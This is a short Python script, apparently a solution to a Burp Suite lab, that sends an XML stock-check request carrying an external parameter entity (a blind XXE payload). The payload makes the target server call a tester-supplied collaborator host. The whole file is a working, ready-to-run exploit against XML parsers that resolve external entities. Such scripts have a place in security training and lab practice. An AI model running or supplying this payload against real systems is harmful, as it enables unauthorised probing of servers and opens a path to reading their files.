import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <full collabolator url>")
        sys.exit(1)

burp_url = sys.argv[1]+'/product/stock'
colab_url = 'http://'+sys.argv[2]

burp_headers = {"Content-Type": "application/xml"}
burp_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM \""+colab_url+"\"> %xxe; ]>\r\n<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>"
requests.post(burp_url, headers=burp_headers, data=burp_data)
